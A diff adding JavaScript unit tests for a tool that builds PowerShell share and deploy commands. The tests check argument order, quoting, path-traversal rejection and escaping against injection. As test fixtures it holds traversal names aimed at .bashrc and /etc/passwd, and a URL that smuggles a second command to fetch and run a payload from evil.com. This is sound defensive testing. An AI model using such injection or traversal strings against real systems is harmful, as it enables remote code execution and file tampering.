@@ -284,5 +284,154 @@ ok("reserved: default.json (with extension) is NOT the base name", !projects.isR
     out === JSON.stringify(JSON.parse(out), null, 2) + "\n");
 })();
 
+// ── C4 share builders (config-sync §12/§13) ────────────────────────────────
+
+// DEFAULT_INSTALL_REPO / DEFAULT_INSTALL_REF
+ok("share: DEFAULT_INSTALL_REPO",
+  projects.DEFAULT_INSTALL_REPO === "permissionBRICK/The-Construct");
+ok("share: DEFAULT_INSTALL_REF",
+  projects.DEFAULT_INSTALL_REF === "main");
+
+// installUrlFor
+ok("share: installUrlFor builds raw.githubusercontent URL",
+  projects.installUrlFor("permissionBRICK/The-Construct", "main") ===
+    "https://raw.githubusercontent.com/permissionBRICK/The-Construct/main/install.ps1");
+ok("share: installUrlFor with custom repo/ref",
+  projects.installUrlFor("fork/Repo", "dev") ===
+    "https://raw.githubusercontent.com/fork/Repo/dev/install.ps1");
+
+// buildShareCommand — exact §12 one-liner shape
+(function () {
+  const defaultUrl = projects.installUrlFor("permissionBRICK/The-Construct", "main");
+  const cmd = projects.buildShareCommand({
+    configRepoUrl: "https://git.co/cfg.git",
+    names: ["web", "api"],
+    installRepo: "permissionBRICK/The-Construct",
+    installRef: "main",
+  });
+  // Must use the scriptblock idiom.
+  ok("share: command uses scriptblock idiom", cmd.startsWith("& ([scriptblock]::Create((irm "));
+  // Must contain the install URL (now single-quoted for PS safety).
+  ok("share: command contains install URL", cmd.includes(defaultUrl));
+  // -ConfigRepo comes before -ImportConfigs which comes before -Action.
+  const crIdx = cmd.indexOf("-ConfigRepo");
+  const icIdx = cmd.indexOf("-ImportConfigs");
+  const acIdx = cmd.indexOf("-Action add-config");
+  ok("share: -ConfigRepo before -ImportConfigs before -Action",
+    crIdx > 0 && icIdx > crIdx && acIdx > icIdx);
+  // Names are comma-joined with no spaces (now PS-quoted).
+  ok("share: names comma-joined no spaces", cmd.includes("-ImportConfigs 'web,api'"));
+  // Default repo/ref: no -Repo/-Ref appended.
+  ok("share: no -Repo/-Ref with default values", !cmd.includes(" -Repo ") && !cmd.includes(" -Ref "));
+  // All interpolated values must be PS single-quoted.
+  ok("share: configRepoUrl is PS-quoted", cmd.includes("-ConfigRepo 'https://git.co/cfg.git'"));
+  ok("share: install URL is PS-quoted", cmd.includes("(irm '" + defaultUrl + "')"));
+})();
+
+// buildShareCommand with non-default repo/ref — appends -Repo/-Ref (PS-quoted).
+(function () {
+  const cmd = projects.buildShareCommand({
+    configRepoUrl: "https://git.co/cfg.git",
+    names: ["billing"],
+    installRepo: "fork/Repo",
+    installRef: "dev",
+  });
+  ok("share: -Repo appended for non-default repo", cmd.includes(" -Repo 'fork/Repo'"));
+  ok("share: -Ref appended for non-default ref", cmd.includes(" -Ref 'dev'"));
+  // Single name, no trailing comma (PS-quoted).
+  ok("share: single name no trailing comma", cmd.includes("-ImportConfigs 'billing'") && !cmd.includes("billing,"));
+})();
+
+// buildShareCommand: -Repo only when repo differs, -Ref only when ref differs.
+(function () {
+  const cmd = projects.buildShareCommand({
+    configRepoUrl: "https://git.co/cfg.git",
+    names: ["x"],
+    installRepo: "fork/Repo",
+    installRef: "main", // same as default ref
+  });
+  ok("share: -Repo appended when repo differs", cmd.includes(" -Repo 'fork/Repo'"));
+  ok("share: -Ref NOT appended when ref matches default", !cmd.includes(" -Ref "));
+})();
+
+// buildDeployPs1 — exact §13 template shape.
+(function () {
+  const ps1 = projects.buildDeployPs1({
+    installRepo: "permissionBRICK/The-Construct",
+    installRef: "main",
+  });
+  const lines = ps1.split("\n");
+  // First line is a comment.
+  ok("deploy: first line is a comment", lines[0].startsWith("#"));
+  // Contains -ConfigDir "$PSScriptRoot".
+  ok('deploy: contains -ConfigDir "$PSScriptRoot"', ps1.includes('-ConfigDir "$PSScriptRoot"'));
+  // Contains -Action add-config.
+  ok("deploy: contains -Action add-config", ps1.includes("-Action add-config"));
+  // Default: no -Repo/-Ref.
+  ok("deploy: no -Repo/-Ref with defaults", !ps1.includes(" -Repo ") && !ps1.includes(" -Ref "));
+  // Trailing newline.
+  ok("deploy: trailing newline", ps1.endsWith("\n"));
+})();
+
+// buildDeployPs1 with non-default fork (PS-quoted).
+(function () {
+  const ps1 = projects.buildDeployPs1({
+    installRepo: "myfork/Construct",
+    installRef: "release",
+  });
+  ok("deploy: -Repo for non-default repo", ps1.includes(" -Repo 'myfork/Construct'"));
+  ok("deploy: -Ref for non-default ref", ps1.includes(" -Ref 'release'"));
+  ok("deploy: uses fork-correct install URL",
+    ps1.includes(projects.installUrlFor("myfork/Construct", "release")));
+})();
+
+// ── Finding 8: validateProfile rejects names with path separators ────────────
+(function () {
+  const slash = projects.validateProfile("x", { name: "/../../../../.bashrc" });
+  ok("validate: path-separator name rejected (forward slash)", !slash.ok && slash.errors.some((e) => e.includes("illegal path")));
+  const backslash = projects.validateProfile("x", { name: "..\\..\\etc\\passwd" });
+  ok("validate: path-separator name rejected (backslash)", !backslash.ok && backslash.errors.some((e) => e.includes("illegal path")));
+  const dotdot = projects.validateProfile("x", { name: ".." });
+  ok("validate: double-dot name rejected", !dotdot.ok && dotdot.errors.some((e) => e.includes("illegal path")));
+  const dot = projects.validateProfile("x", { name: "." });
+  ok("validate: single-dot name rejected", !dot.ok && dot.errors.some((e) => e.includes("illegal path")));
+  const traversal = projects.validateProfile("x", { name: "foo/../bar" });
+  ok("validate: embedded traversal rejected", !traversal.ok && traversal.errors.some((e) => e.includes("illegal path")));
+  // Normal names still pass.
+  ok("validate: normal name still passes", projects.validateProfile("web", { name: "web" }).ok);
+  ok("validate: hyphenated name still passes", projects.validateProfile("my-project", { name: "my-project" }).ok);
+})();
+
+// ── Finding 9: PS injection in share commands ────────────────────────────────
+(function () {
+  // A malicious configRepoUrl with a PS semicolon injection attempt must be
+  // single-quoted so the semicolon is literal, not a statement separator.
+  const maliciousUrl = "https://evil.com; Invoke-WebRequest https://evil.com/payload | iex #";
+  const cmd = projects.buildShareCommand({
+    configRepoUrl: maliciousUrl,
+    names: ["p"],
+    installRepo: "permissionBRICK/The-Construct",
+    installRef: "main",
+  });
+  // The entire configRepoUrl must be wrapped in PS single quotes.
+  ok("share-injection: configRepoUrl is fully single-quoted",
+    cmd.includes("-ConfigRepo '" + maliciousUrl + "'"));
+  // The semicolon must NOT appear as a bare (unquoted) statement separator.
+  // Verify by checking the configRepoUrl is enclosed in quotes.
+  const crIdx = cmd.indexOf("-ConfigRepo '");
+  const closingQuote = cmd.indexOf("'", crIdx + 13 + maliciousUrl.length);
+  ok("share-injection: malicious URL enclosed before -ImportConfigs",
+    crIdx >= 0 && closingQuote >= 0 && closingQuote < cmd.indexOf("-ImportConfigs"));
+
+  // A name with a single quote must be escaped (doubled) in PS.
+  const cmd2 = projects.buildShareCommand({
+    configRepoUrl: "https://git.co/cfg.git",
+    names: ["it's"],
+    installRepo: "permissionBRICK/The-Construct",
+    installRef: "main",
+  });
+  ok("share-injection: single quote in name is doubled for PS", cmd2.includes("'it''s'"));
+})();
+
 console.log(`\n  project-profile unit tests — ${pass}/${pass + fail} passed\n`);
 process.exit(fail ? 1 : 0);
